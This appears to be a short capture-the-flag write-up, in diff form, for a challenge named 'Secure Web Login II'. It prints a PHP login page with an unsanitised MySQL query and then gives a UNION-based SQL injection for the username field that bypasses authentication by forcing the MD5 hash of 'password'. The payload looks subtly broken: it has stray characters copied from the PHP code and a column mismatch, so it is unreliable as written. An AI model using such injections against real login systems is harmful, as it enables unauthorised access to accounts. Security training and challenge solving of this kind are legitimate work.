@@ -1,0 +1,47 @@
+Source code from site:
+
+<html>
+<head>
+Secure Web Login II
+</head>
+<body>
+
+<?php
+if($_POST[user] && $_POST[pass]) {
+  mysql_connect("localhost","php3","xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
+  mysql_select_db("php3");
+
+  $user = $_POST[user];
+  $pass = md5($_POST[pass]);
+  $query = @mysql_fetch_array(mysql_query("select pw from php3 where user='$user'"));
+
+  if (($query[pw]) && (!strcasecmp($pass, $query[pw]))) {
+    echo "<p>Logged in! Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
+  }
+  else {
+    echo("<p>Log in failure!</p>");
+  }
+}
+
+?>
+
+
+<form method=post action=index.php>
+<input type=text name=user value="Username">
+<input type=password name=pass value="Password">
+<input type=submit>
+</form>
+</body>
+<a href="index.phps">Source</a>
+</html>
+
+Let's inject a fake password rather than a fake user:
+
+$query = @mysql_fetch_array(mysql_query("select pw from php3 where user='$user'")); //Original
+$MD5OFPASS = md5('password');
+$query = @mysql_fetch_array(mysql_query("select pw from php3 where user='' UNION SELECT user FROM php3 WHERE pw='$MD5OFPASS'"));
+
+And use the input fields:
+
+Username: ' UNION SELECT * FROM php3 WHERE (pw='5f4dcc3b5aa765d61d8327deb882cf99')")); -- 
+Password: password
